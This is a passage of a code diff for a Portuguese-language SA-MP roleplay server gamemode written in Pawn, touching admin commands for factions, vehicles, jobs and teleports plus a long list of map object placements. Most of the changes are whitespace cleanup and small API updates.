         SendClientMessage(playerid, COLOR_CHAT, "[Types]: {FFFFFF}1: Polícia - 2: Médicos - 3: Mecénicos - 4: News - 5: Governo - 6: Drogas");
         SendClientMessage(playerid, COLOR_CHAT, "[Types]: {FFFFFF}7: Máfia - 8: Street Racers");
-        
+
 		return 1;
 	}
     if(faction <= 0 || faction > (MAX_FACTIONS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
@@ -27349,7 +27330,7 @@ COMMAND:afactionname(playerid, params[], help)
     new id, nome[17], string[128];
 
     if(sscanf(params, "ds[16]", id, nome)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/afactionname <faction> <nome>");
-    
+
     if(id <= 0 || id > (MAX_FACTIONS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
 
 	format(fInfo[id][Nome], 32, "%s", nome);
@@ -27372,7 +27353,7 @@ COMMAND:afactionspawn(playerid, params[], help)
 
 	GetPlayerPos(playerid, x, y, z);
 	GetPlayerFacingAngle(playerid, a);
-	
+
 	fInfo[faction][X] = x;
 	fInfo[faction][Y] = y;
 	fInfo[faction][Z] = z;
@@ -27413,10 +27394,10 @@ COMMAND:afactionsetrank(playerid, params[], help)
     if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
     if(faction <= 0 || faction > (MAX_FACTIONS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
     if(rank <= 0 || rank > 6) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Rank inválido");
-    
+
     pInfo[giveplayerid][Faction] = faction;
     pInfo[giveplayerid][FactionRank] = rank;
-    
+
     format(string, sizeof(string), "Puseste o jogador %s na faction %s com o rank %d", GetPlayerNameEx(giveplayerid), fInfo[faction][Nome], rank);
     SendClientMessage(playerid, COLOR_INFO, string);
     format(string, sizeof(string), "O Administrador %s colocou-te na faction %s com o rank %d", GetPlayerNameEx(playerid), fInfo[faction][Nome], rank);
@@ -27445,7 +27426,7 @@ COMMAND:acarinfo(playerid, params[], help)
 
 	new car = GetPlayerVehicleID(playerid);
 	new string[128];
-	
+
 	format(string, sizeof(string), "_______________________________________[CAR INFO %d]_______________________________________", car);
 	SendClientMessage(playerid, COLOR_INFO, string);
 	format(string, sizeof(string), "Matrícula: {FFFFFF}%s - {52E3BA}Modelo: {FFFFFF}%d - {52E3BA}Faction: {FFFFFF}%d", cInfo[car][Matricula], cInfo[car][Model], cInfo[car][Faction]);
@@ -27458,7 +27439,7 @@ COMMAND:acarinfo(playerid, params[], help)
 	SendClientMessage(playerid, COLOR_INFO, string);
     format(string, sizeof(string), "__________________________________________________________________________________________", car);
     SendClientMessage(playerid, COLOR_INFO, string);
-    
+
     return 1;
 }
 
@@ -27480,7 +27461,7 @@ COMMAND:aresettuning(playerid, params[], help)
 	cInfo[car][mod9] = 0;
 	cInfo[car][mod10] = 0;
 	cInfo[car][mod11] = 0;
-	
+
 	ChangeVehiclePaintjob(car, 3);
 	RemoveVehicleComponent(car, cInfo[car][mod1]);
 	RemoveVehicleComponent(car, cInfo[car][mod2]);
@@ -27495,7 +27476,7 @@ COMMAND:aresettuning(playerid, params[], help)
 	RemoveVehicleComponent(car, cInfo[car][mod11]);
 
 	GuardarCarro(car);
-	
+
 	SendClientMessage(playerid, COLOR_INFO, "Tuning resetado");
 
     return 1;
@@ -27510,7 +27491,7 @@ COMMAND:respawnjoblic(playerid, params[], help)
 
 	RespawnCounterJob = 1;
 
- 	TimerRespawnJobFac = SetTimer("RespawnJobFac", 1000, true);
+ 	TimerRespawnJobFac = SetTimer_("RespawnJobFac", 1000, TIMER_NODELAY, TIMER_INFINITO);
  	format(string, sizeof(string), "Respawn de Job/Licenças iniciado por %s", GetPlayerNameEx(playerid));
 
 	SendClientMessageToAll(COLOR_CHAT, string);
@@ -27527,7 +27508,7 @@ COMMAND:respawngeral(playerid, params[], help)
 
 	RespawnCounter = 1;
 
-	TimerRespawn = SetTimer("RespawnGeral", 1000, true);
+	TimerRespawn = SetTimer_("RespawnGeral", 1000, TIMER_NODELAY, TIMER_INFINITO);
  	format(string, sizeof(string), "Respawn geral iniciado por %s", GetPlayerNameEx(playerid));
 
 	SendClientMessageToAll(COLOR_CHAT, string);
@@ -27538,7 +27519,7 @@ COMMAND:respawngeral(playerid, params[], help)
 COMMAND:respawncarro(playerid, params[], help)
 {
     if(pInfo[playerid][Admin] < 2) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOADMIN);
-    
+
     if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);
 
 	new car = GetPlayerVehicleID(playerid);
@@ -27557,17 +27538,17 @@ COMMAND:respawncarro(playerid, params[], help)
 COMMAND:acarenter(playerid, params[], help)
 {
     if(pInfo[playerid][Admin] < 2) return SendClientMessage(playerid, -1, MSG_NOADMIN);
-    
+
     new car;
-    
+
     if(sscanf(params, "d", car)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/acarenter <id>");
     if(IsVehicleOccupied(car)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse veículo está ocupado");
     if(car <= 0 || car > (MAX_CARROS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Veículo inválido");
 
 	new string[128];
-	
+
     PutPlayerInVehicle(playerid, cInfo[car][ID], 0);
-    
+
     format(string, sizeof(string), "Entraste no carro %d", car);
     SendClientMessage(playerid, COLOR_INFO, string);
 
@@ -27588,7 +27569,7 @@ COMMAND:getvhere(playerid, params[], help)
 	new Float:plocx,Float:plocy,Float:plocz;
 
 	GetPlayerPos(playerid, plocx, plocy, plocz);
-	SetPlayerPosEx(playerid, plocx+0.3, plocy+0.3, plocz);
+	SetPlayerPosEx(playerid, plocx+0.3, plocy+0.3, plocz, -1, -1);
 	SetVehiclePosEx(car, plocx, plocy, plocz);
 
     format(string, sizeof(string), "Trouxeste o carro %d até ti", car);
@@ -27606,9 +27587,9 @@ COMMAND:editarchave(playerid, params[], help)
     if(sscanf(params, "ddd", giveplayerid, slot, id)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/editarchave <playerid> <slot> <id>");
 	if(slot < 1 || slot > 8) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Slot inválido");
 	if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
-	
+
 	new string[128];
-	
+
 	switch(slot)
 	{
 	    case 1: { pInfo[giveplayerid][ChaveCarro1] = id; }
@@ -27640,7 +27621,7 @@ COMMAND:acarpark(playerid, params[], help)
     new Float:cx, Float:cy, Float:cz, Float:angle, vw, interior, Float:hp;
     vw = GetPlayerVirtualWorld(playerid);
     interior = GetPlayerInterior(playerid);
-    
+
     GetVehicleHealth(car, hp);
     GetVehicleZAngle(car, angle);
     GetPlayerPos(playerid, cx, cy, cz);
@@ -27681,12 +27662,12 @@ COMMAND:acarcolor(playerid, params[], help)
 
     new car = GetPlayerVehicleID(playerid);
     new string[128];
-    
+
     cInfo[car][Color1] = c1;
     cInfo[car][Color2] = c2;
-    
+
     ChangeVehicleColor(car, cInfo[car][Color1], cInfo[car][Color2]);
-	
+
 	GuardarCarro(car);
 
     format(string, sizeof(string), "Alteraste a cor do carro %d para %d e %d", car, c1, c2);
@@ -27708,7 +27689,7 @@ COMMAND:acarmodel(playerid, params[], help)
     new car = GetPlayerVehicleID(playerid);
     new string[128];
     new Float:cx, Float:cy, Float:cz, Float:angle;
-    
+
     GetVehiclePos(cInfo[car][ID], cx, cy, cz);
     GetVehicleZAngle(cInfo[car][ID], angle);
 
@@ -27719,18 +27700,18 @@ COMMAND:acarmodel(playerid, params[], help)
 	cInfo[car][Angle] = angle;
 
     DestroyVehicle(cInfo[car][ID]);
-    
+
     IsARespawn[car] = true;
 	cInfo[car][ID] = CreateVehicle(cInfo[car][Model], cInfo[car][X], cInfo[car][Y], cInfo[car][Z], cInfo[car][Angle], cInfo[car][Color1], cInfo[car][Color2], -1, IsACopCar(cInfo[car][Model]) ? 1 : 0);
 	SetVehicleVirtualWorld(cInfo[car][ID], cInfo[car][VirtualWorld]);
 	LinkVehicleToInterior(cInfo[car][ID], cInfo[car][Interior]);
 	AtualizarDanosCarro(car);
-	
+
 	SetVehiclePos(cInfo[car][ID], cx, cy, cz);
 	SetVehicleZAngle(cInfo[car][ID], angle);
-	
+
 	PutPlayerInVehicle(playerid, cInfo[car][ID], 0);
-	
+
 	GuardarCarro(car);
 
     format(string, sizeof(string), "Puseste o carro %d com o model %d", car, id);
@@ -27750,7 +27731,7 @@ COMMAND:acarfaction(playerid, params[], help)
 
     new car = GetPlayerVehicleID(playerid);
     new string[128];
-    
+
     cInfo[car][Faction] = id;
     cInfo[car][Type] = -2;
     GuardarCarro(car);
@@ -27764,13 +27745,13 @@ COMMAND:acarfaction(playerid, params[], help)
 COMMAND:acartype(playerid, params[], help)
 {
     if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);
-    
+
     new id, string[128];
-    
+
     if(sscanf(params, "d", id))
 	{
         SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/acartype <type>");
-        
+
         format(string, sizeof(string), "[Types]: {FFFFFF}-2: Faction -1: Pessoal - 0: Não configurado - {FFFFFF}50: Carta de Ligeiros - 51: Carta de Pesados", jInfo[1][ID], jInfo[1][Nome], jInfo[2][ID], jInfo[2][Nome], jInfo[3][ID], jInfo[3][Nome], jInfo[4][ID], jInfo[4][Nome], jInfo[5][ID], jInfo[5][Nome]);
         SendClientMessage(playerid, COLOR_CHAT, string);
         format(string, sizeof(string), "[Types]: {FFFFFF}52: Carta de Motociclos - 53: Carta de Barco", jInfo[1][ID], jInfo[1][Nome], jInfo[2][ID], jInfo[2][Nome], jInfo[3][ID], jInfo[3][Nome], jInfo[4][ID], jInfo[4][Nome], jInfo[5][ID], jInfo[5][Nome]);
@@ -27783,16 +27764,16 @@ COMMAND:acartype(playerid, params[], help)
 		return 1;
 	}
     if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);
-    
+
     new car = GetPlayerVehicleID(playerid);
-    
+
     cInfo[car][Type] = id;
-    
+
     GuardarCarro(car);
-    
+
     format(string, sizeof(string), "Alteraste o type do carro %d para %d", car, id);
     SendClientMessage(playerid, COLOR_INFO, string);
-    
+
 	return 1;
 }
 
@@ -27801,7 +27782,7 @@ COMMAND:resetcarros(playerid, params[], help)
     if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);
 
 	new model, i, Float:distance = 6.0, Float:metres = distance, Float:a, vw, interior;
-	
+
 	vw = GetPlayerVirtualWorld(playerid);
 	interior = GetPlayerInterior(playerid);
 
@@ -27819,7 +27800,7 @@ COMMAND:resetcarros(playerid, params[], help)
 
 		GetPlayerPos(playerid, cInfo[i][X], cInfo[i][Y], cInfo[i][Z]);
 		GetPlayerFacingAngle(playerid, a);
-		
+
 		cInfo[i][Model] = model;
 		cInfo[i][Type] = 0;
 		cInfo[i][X] += (metres * floatsin(-a, degrees));
@@ -27827,7 +27808,7 @@ COMMAND:resetcarros(playerid, params[], help)
 		cInfo[i][Angle] = a;
 		cInfo[i][VirtualWorld] = vw;
 		cInfo[i][Interior] = interior;
-		
+
 		cInfo[i][Color1] = 0;
 		cInfo[i][Color2] = 0;
 		cInfo[i][Faction] = 0;
@@ -27861,9 +27842,9 @@ COMMAND:resetcarros(playerid, params[], help)
 		cInfo[i][RadioStatus] = 0;
 		cInfo[i][IsCaravana] = 0;
 		cInfo[i][CaravanaCasaID] = 0;
-		
+
 		DestroyVehicle(cInfo[i][ID]);
-		
+
 		IsARespawn[i] = true;
 		cInfo[i][ID] = CreateVehicle(cInfo[i][Model], cInfo[i][X], cInfo[i][Y], cInfo[i][Z], cInfo[i][Angle], cInfo[i][Color1], cInfo[i][Color2], -1, IsACopCar(cInfo[i][Model]) ? 1 : 0);
 		SetVehicleVirtualWorld(cInfo[i][ID], cInfo[i][VirtualWorld]);
@@ -27872,9 +27853,9 @@ COMMAND:resetcarros(playerid, params[], help)
 	}
 	MatriculasAtualizar();
 	GuardarCarros();
-	
+
     SendClientMessage(playerid, COLOR_INFO, "Deste reset a todos os carros do servidor");
-    
+
     return 1;
 }
 
@@ -27892,31 +27873,31 @@ COMMAND:acidadecmds(playerid, params[], help)
 COMMAND:acidadespawn(playerid, params[], help)
 {
     if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);
-    
+
     new id;
 
     if(sscanf(params, "d", id)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/acidadespawn <cidade>");
     if(id < 0 || id > (MAX_CIDADES-1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Cidade inválida.");
-    
+
     new Float:x, Float:y, Float:z, Float:a, pInterior, pVirtualWorld, string[128];
-    
+
     GetPlayerPos(playerid, x, y, z);
     GetPlayerFacingAngle(playerid, a);
 	pInterior = GetPlayerInterior(playerid);
 	pVirtualWorld = GetPlayerVirtualWorld(playerid);
-    
+
     SpawnInfo[id][X] = x;
     SpawnInfo[id][Y] = y;
     SpawnInfo[id][Z] = z;
     SpawnInfo[id][A] = a;
     SpawnInfo[id][Interior] = pInterior;
     SpawnInfo[id][VirtualWorld] = pVirtualWorld;
-    
+
     GuardarCidade(id);
 
     format(string, sizeof(string), "Alteraste o spawn da cidade %d para a tua posição", id);
     SendClientMessage(playerid, COLOR_INFO, string);
-    
+
     return 1;
 }
 
@@ -27948,7 +27929,7 @@ COMMAND:ajobcmds(playerid, params[], help)
     SendClientMessage(playerid, COLOR_CHAT, "[Comandos de JOB:] {FFFFFF}/ajobname - /ajobsalario - /ajobrotasalario - /ajoblic - /ajobinfo");
     SendClientMessage(playerid, COLOR_CHAT, "[Comandos de JOB:] {FFFFFF}/ajobdespedir - /ajobserotas - /ajobsetlevel");
     SendClientMessage(playerid, COLOR_ERRO, "___________________________________________________________________________________________________");
-    
+
     return 1;
 }
 
@@ -28019,9 +28000,9 @@ COMMAND:ajobinfo(playerid, params[], help)
 
     if(sscanf(params, "d", job)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/ajobinfo <id>");
     if(job <= 0 || job > (MAX_JOBS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Job inválido");
-    
+
     new lic[16];
-    
+
 	if(jInfo[job][Ligeiros] == 1)
 	{
 	    lic = "Ligeiros";
@@ -28042,7 +28023,7 @@ COMMAND:ajobinfo(playerid, params[], help)
 	{
         lic = "Não Configurado";
 	}
-	
+
     format(string, sizeof(string), "{FF9900}Job: %s - Salário: %d$ - Salário por Rota: %d$ - Licença: %s", jInfo[job][Nome], jInfo[job][Salario], jInfo[job][RotaSalario], lic);
 	SendClientMessage(playerid, COLOR_INFO, string);
 
@@ -28059,7 +28040,7 @@ COMMAND:ajoblic(playerid, params[], help)
 	{
 	    SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/ajoblic <id> <carta>");
 	    SendClientMessage(playerid, COLOR_CHAT, "[Tipos de carta]: {FFFFFF}0: Ligeiros - 1: Pesados - 2: Motociclos - 3: Barco");
-	    
+
 	    return 1;
 	}
 
@@ -28076,7 +28057,7 @@ COMMAND:ajoblic(playerid, params[], help)
 			jInfo[id][Pesados] = 0;
 			jInfo[id][Motociclos] = 0;
 			jInfo[id][Barco] = 0;
-			
+
 			format(string, sizeof(string), "O requerimento para trabalhar no job %d é ter carta de Ligeiros", id);
 	    }
 	    case 1:
@@ -28085,7 +28066,7 @@ COMMAND:ajoblic(playerid, params[], help)
 			jInfo[id][Pesados] = 1;
 			jInfo[id][Motociclos] = 0;
 			jInfo[id][Barco] = 0;
-			
+
 			format(string, sizeof(string), "O requerimento para trabalhar no job %d é ter carta de Pesados", id);
 	    }
 	    case 2:
@@ -28094,7 +28075,7 @@ COMMAND:ajoblic(playerid, params[], help)
 			jInfo[id][Pesados] = 0;
 			jInfo[id][Motociclos] = 1;
 			jInfo[id][Barco] = 0;
-			
+
 			format(string, sizeof(string), "O requerimento para trabalhar no job %d é ter carta de Motociclos", id);
 		}
 		case 3:
@@ -28103,7 +28084,7 @@ COMMAND:ajoblic(playerid, params[], help)
 			jInfo[id][Pesados] = 0;
 			jInfo[id][Motociclos] = 0;
 			jInfo[id][Barco] = 1;
-			
+
 			format(string, sizeof(string), "O requerimento para trabalhar no job %d é ter carta de Barco", id);
 		}
 	}
@@ -28117,17 +28098,17 @@ COMMAND:ajoblic(playerid, params[], help)
 COMMAND:ajobname(playerid, params[], help)
 {
     if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);
-    
+
     new id, nome[32];
-    
+
     if(sscanf(params, "ds[32]", id, nome)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/ajobname <id> <nome do job>");
     if(id < 1 || id > (MAX_JOBS-1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Job inválido.");
-    
+
     new string[128];
-	
+
 	format(jInfo[id][Nome], 32, "%s", nome);
 	GuardarJob(id);
-    
+
     format(string, sizeof(string), "Alteraste o nome do job %d para %s", id, nome);
     SendClientMessage(playerid, COLOR_INFO, string);
 
@@ -28149,7 +28130,7 @@ COMMAND:ajobsalario(playerid, params[], help)
 	jInfo[id][Salario] = salario;
 	GuardarJob(id);
 
-    format(string, sizeof(string), "Alteraste o Salário do job %d para %d$", id, salario);
+    format(string, sizeof(string), "Alteraste o salário do job %d para %d$", id, salario);
     SendClientMessage(playerid, COLOR_INFO, string);
 
     return 1;
@@ -28170,7 +28151,7 @@ COMMAND:ajobrotasalario(playerid, params[], help)
 	jInfo[id][RotaSalario] = salario;
 	GuardarJob(id);
 
-    format(string, sizeof(string), "Alteraste o Salário por rota do job %d para %d$", id, salario);
+    format(string, sizeof(string), "Alteraste o salário por rota do job %d para %d$", id, salario);
     SendClientMessage(playerid, COLOR_INFO, string);
 
     return 1;
@@ -28187,11 +28168,9 @@ COMMAND:gotopesca(playerid, params[], help)
 	}
 	else
 	{
-		SetPlayerPosEx(playerid, 574, -2510, 2.7);
+		SetPlayerPosEx(playerid, 574, -2510, 2.7, 0, 0);
 	}
-	SetPlayerInterior(playerid,0);
-	SetPlayerVirtualWorld(playerid,0);
-
+	// cancro
     return 1;
 }
 
@@ -28206,10 +28185,8 @@ COMMAND:gotolv(playerid, params[], help)
 	}
 	else
 	{
-		SetPlayerPosEx(playerid, 1699.2,1435.1, 10.7);
+		SetPlayerPosEx(playerid, 1699.2,1435.1, 10.7, 0, 0);
 	}
-	SetPlayerInterior(playerid,0);
-	SetPlayerVirtualWorld(playerid,0);
 
     return 1;
 }
@@ -28225,10 +28202,8 @@ COMMAND:gotodm(playerid, params[], help)
 	}
 	else
 	{
-		SetPlayerPosEx(playerid, 713.9617, -565.1425, 16.0630);
+		SetPlayerPosEx(playerid, 713.9617, -565.1425, 16.0630, 0, 0);
 	}
-	SetPlayerInterior(playerid,0);
-	SetPlayerVirtualWorld(playerid,0);
 
     return 1;
 }
@@ -28244,10 +28219,8 @@ COMMAND:gotomg(playerid, params[], help)
 	}
 	else
 	{
-		SetPlayerPosEx(playerid, 1319.1113, 297.8485, 19.2818);
+		SetPlayerPosEx(playerid, 1319.1113, 297.8485, 19.2818, 0, 0);
 	}
-	SetPlayerInterior(playerid,0);
-	SetPlayerVirtualWorld(playerid,0);
 
     return 1;
 }
@@ -28263,10 +28236,8 @@ COMMAND:gotopc(playerid, params[], help)
 	}
 	else
 	{
-		SetPlayerPosEx(playerid, 2200.0015, 52.0060, 26.2100);
+		SetPlayerPosEx(playerid, 2200.0015, 52.0060, 26.2100, 0, 0);
 	}
-	SetPlayerInterior(playerid,0);
-	SetPlayerVirtualWorld(playerid,0);
 
     return 1;
 }
@@ -28282,11 +28253,8 @@ COMMAND:gotofc(playerid, params[], help)
 	}
 	else
 	{
-		SetPlayerPosEx(playerid, -285.3123,1088.4076,19.7422);
+		SetPlayerPosEx(playerid, -285.3123,1088.4076,19.7422, 0, 0);
 	}
-	
-	SetPlayerInterior(playerid,0);
-	SetPlayerVirtualWorld(playerid,0);
 
     return 1;
 }
@@ -28302,11 +28270,8 @@ COMMAND:gotolb(playerid, params[], help)
 	}
 	else
 	{
-		SetPlayerPosEx(playerid, -794.8752,1557.0309,27.1506);
+		SetPlayerPosEx(playerid, -794.8752,1557.0309,27.1506, 0, 0);
 	}
-	
-	SetPlayerInterior(playerid,0);
-	SetPlayerVirtualWorld(playerid,0);
 
     return 1;
 }
@@ -28322,11 +28287,8 @@ COMMAND:gotosf(playerid, params[], help)
 	}
 	else
 	{
-		SetPlayerPosEx(playerid, -1417.0,-295.8,14.1);
+		SetPlayerPosEx(playerid, -1417.0,-295.8,14.1, 0, 0);
 	}
-
-	SetPlayerInterior(playerid,0);
-	SetPlayerVirtualWorld(playerid,0);
 
     return 1;
 }
@@ -28342,11 +28304,8 @@ COMMAND:gotols(playerid, params[], help)
 	}
 	else
 	{
-		SetPlayerPosEx(playerid, 1473.4165,-1697.8749,14.0469);
+		SetPlayerPosEx(playerid, 1473.4165,-1697.8749,14.0469, 0, 0);
 	}
-
-	SetPlayerInterior(playerid,0);
-	SetPlayerVirtualWorld(playerid,0);
 
     return 1;
 }
@@ -28362,11 +28321,8 @@ COMMAND:gotolsa(playerid, params[], help)
 	}
 	else
 	{
-		SetPlayerPosEx(playerid, 1757.0024,-2538.3718,14.5153);
+		SetPlayerPosEx(playerid, 1757.0024,-2538.3718,14.5153, 0, 0);
 	}
-
-	SetPlayerInterior(playerid,0);
-	SetPlayerVirtualWorld(playerid,0);
 
     return 1;
 }
@@ -28382,11 +28338,8 @@ COMMAND:gotolp(playerid, params[], help)
 	}
 	else
 	{
-		SetPlayerPosEx(playerid, -249.6600,2693.1934,62.6836);
+		SetPlayerPosEx(playerid, -249.6600,2693.1934,62.6836, 0, 0);
 	}
-	
-	SetPlayerInterior(playerid,0);
-	SetPlayerVirtualWorld(playerid,0);
 
     return 1;
 }
@@ -28405,7 +28358,7 @@ public CarregarMapas()
 	new tick2;
 
 	tick1 = GetTickCount();
-	
+
 	// ---------------------------- FIXES ----------------------------
 
 	/* PAY N SPRAY */
@@ -28419,26 +28372,26 @@ public CarregarMapas()
 	CreateDynamicObject(6959, 180.70590, -2764.79150, 1.55490,   0.00000, -90.00000, 93.00000);
 	CreateDynamicObject(6959, 180.02966, -2739.07813, 1.55490,   0.00000, -90.00000, 88.20010);
 	CreateDynamicObject(6959, 198.23430, -2751.36938, 1.55490,   0.00000, -90.00000, 0.00000);
-	
+
 	// ---------------------------- PORTÕES ---------------------------------
-	
+
  	/*	GARAGEM PSP */
 	CreateDynamicObject(2928, 1582.91345, -1637.87366, 13.62220,   0.00000, 0.00000, 0.00000);
 	CreateDynamicObject(19372, 1582.87415, -1637.99963, 16.33711,   0.00000, 0.00000, 89.99034);
 	pspgaragem1 = CreateDynamicObject(2957, 1590.41174, -1638.20911, 13.91207,   0.00000, 0.00000, 360.14096);
 	pspgaragem2 = CreateDynamicObject(2957, 1585.94800, -1638.11829, 13.84867,   0.00000, 0.00000, 360.14096);
-	
+
 	pspentrada1 = CreateDynamicObjectEx(1495, 1560.11401, -1683.49597, 1100.06995,   0.00000, 0.00000, 0.00000); // porta psp entrada (x aberta: 1558.60876) 1558.60876, -1683.49597, 1100.06995
 	pspentrada2 = CreateDynamicObjectEx(1495, 1561.62024, -1667.60498, 1100.06995,   0.00000, 0.00000, 180.00000); // porta psp entrada (x aberta: 1563.14172) 1563.14172, -1667.60498, 1100.06995
-	
+
 	srgaragem1_1 = CreateDynamicObject(19456, 327.46304, -1479.92493, 29.11834,   0.00000, 0.00000, 53.91243);
 	srgaragem1_2 = CreateDynamicObject(19456, 327.46304, -1479.92493, 25.71881,   0.00000, 0.00000, 53.91243); // 22.55216
-	
+
 	srgaragem2_1 = CreateDynamicObject(19456, 280.22620, -1548.16333, 29.65302,   0.00000, 0.00000, 67.38001);
 	srgaragem2_2 = CreateDynamicObject(19456, 280.20914, -1548.15283, 26.24194,   0.00000, 0.00000, 67.38001); // 22.32809
 
 	// ---------------------------- HOSPITAl 3 ------------------------------
-	
+
 	CreateDynamicObject(14858, 1158.02209, -2523.12891, 117.96269,   0.00000, 0.00000, 0.00000);
 	CreateDynamicObject(1538, 1145.07642, -2509.38159, 112.82207,   0.00000, 0.00000, 270.00000);
 	CreateDynamicObject(1538, 1145.05994, -2512.38306, 112.82207,   0.00000, 0.00000, 90.00000);
@@ -28595,9 +28548,9 @@ public CarregarMapas()
 	CreateDynamicObject(1567, 1135.23523, -2510.58911, 112.82207,   0.00000, 0.00000, 0.00000);
 	CreateDynamicObject(1569, 1135.25366, -2510.57080, 112.82207,   0.00000, 0.00000, 179.48901);
 	CreateDynamicObject(1569, 1134.97009, -2510.57129, 112.82207,   0.00000, 0.00000, 180.48352);
-	
+
 	// ---------------------------- HOSPITAL 2 -------------------------------
-	
+
 	CreateDynamicObject(14668, 1241.97754, 316.33203, -12.74219,   0.00000, 0.00000, 155.50049);
 	CreateDynamicObject(16500, 1250.81274, 320.83963, -10.74798,   0.00000, 0.00000, 155.54028);
 	CreateDynamicObject(16500, 1239.35352, 326.01270, -10.74798,   0.00000, 0.00000, 335.35217);
@@ -28699,9 +28652,9 @@ public CarregarMapas()
 	CreateDynamicObject(2380, 1254.35303, 320.86847, -11.49442,   0.00000, 0.00000, 335.16516);
 	CreateDynamicObject(2816, 1246.20117, 317.14130, -12.24656,   0.00000, 0.00000, 0.00000);
 	CreateDynamicObject(2852, 1247.99146, 322.01169, -12.24656,   0.00000, 0.00000, 0.00000);
-	
+
 	// ---------------------------- NEWS -------------------------------------
-	
+
 	CreateDynamicObject(19376, 247.74001, 1783.13000, 700.00000,   0.00000, 90.00000, 0.00000);
 	CreateDynamicObject(19376, 258.23999, 1783.14001, 700.00000,   0.00000, 90.00000, 0.00000);
 	CreateDynamicObject(19376, 247.74001, 1773.55005, 700.00000,   0.00000, 90.00000, 0.00000);
@@ -28850,9 +28803,9 @@ public CarregarMapas()
 	CreateDynamicObject(19378, 258.23999, 1783.14001, 703.42999,   0.00000, 90.00000, 0.00000);
 	CreateDynamicObject(1502, 257.78668, 1776.65613, 700.08728,   0.00000, 0.00000, 90.73931);
 
-	
+
 	// ---------------------------- OFFICE -------------------------------------
-	
+
 	CreateDynamicObject(14597, 2815.54712, -1679.76794, 665.46301,   0.00000, 0.00000, 0.00000);
 	CreateDynamicObject(1491, 2813.73389, -1683.05603, 663.41602,   0.00000, 0.00000, 0.00000);
 	CreateDynamicObject(1491, 2813.76904, -1676.48596, 663.46600,   0.00000, 0.00000, 0.00000);
@@ -31109,9 +31062,9 @@ public CarregarMapas()
 	CreateDynamicObject(1722,915.4871826,2373.5632324,245.4621124,0.0000000,0.0000000,180.0000000); //object(off_chairnu) (1)
 	CreateDynamicObject(1722,916.1394043,2373.5656738,245.4621124,0.0000000,0.0000000,179.9945068); //object(off_chairnu) (2)
 	CreateDynamicObject(1722,916.7902832,2373.5754395,245.4621124,0.0000000,0.0000000,179.9945068); //object(off_chairnu) (3)
-	
+
 	// ------------ INTERIOR AEROPORTO ---------------
-	
+
 	CreateDynamicObject(1566, -1869.59998, 42.40000, 1055.50000,   0.00000, 0.00000, 269.99997);
 	CreateDynamicObject(8547, -1875.00000, -15.19922, 1054.19995,   0.00000, 0.00000, 270.00000);
 	CreateDynamicObject(2938, -1883.69995, 49.40000, 1056.80005,   0.00000, 0.00000, 90.00000);
@@ -31310,9 +31263,9 @@ public CarregarMapas()
 	CreateDynamicObject(1495, -1837.40002, 49.40000, 1054.19995,   0.00000, 0.00000, 180.00000);
 	CreateDynamicObject(1495, -1841.50000, 49.40000, 1054.19995,   0.00000, 0.00000, 359.99451);
 	CreateDynamicObject(2395, -1838.09998, 49.40000, 1054.09998,   0.00000, 0.00000, 180.00000);
-	
+
 	// --------- INTERIOR CENTRO COMERCIAL ----------
-	
+
 	CreateDynamicObject(19450, 265.06906, 114.50306, 1033.86218,   0.00000, 0.00000, 0.00000);
 	CreateDynamicObject(19454, 266.89120, 114.50364, 1032.29248,   0.00000, 90.00000, 0.00000);
 	CreateDynamicObject(19454, 270.38199, 114.52661, 1032.29248,   0.00000, 90.00000, 0.00000);
@@ -31797,9 +31750,9 @@ public CarregarMapas()
 	CreateDynamicObject(638, 255.82747, 109.11057, 1033.00195,   0.00000, 0.00000, 270.87082);
 	CreateDynamicObject(2762, 259.27213, 106.23282, 1032.79004,   0.00000, 0.00000, 0.62757);
 	CreateDynamicObject(14820, 259.29031, 106.21394, 1033.28271,   0.00000, 0.00000, 0.00000);
-	
+
 	// ------------ Interior Caravana Journey ------------------
-	
+
 	CreateDynamicObject(2528,2391.0000000,-1711.3200000,-47.6200000,0.0000000,0.0000000,0.0000000); //
 	CreateDynamicObject(2518,2391.3500000,-1711.3800000,-47.7300000,0.0000000,0.0000000,0.0000000); //
 	CreateDynamicObject(14762,2393.5200000,-1715.9000000,-45.7400000,0.0000000,0.0000000,180.0000000); //
@@ -31826,9 +31779,9 @@ public CarregarMapas()
 	CreateDynamicObject(2279,2389.7100000,-1711.8900000,-45.7400000,0.0000000,0.0000000,90.0000000); //
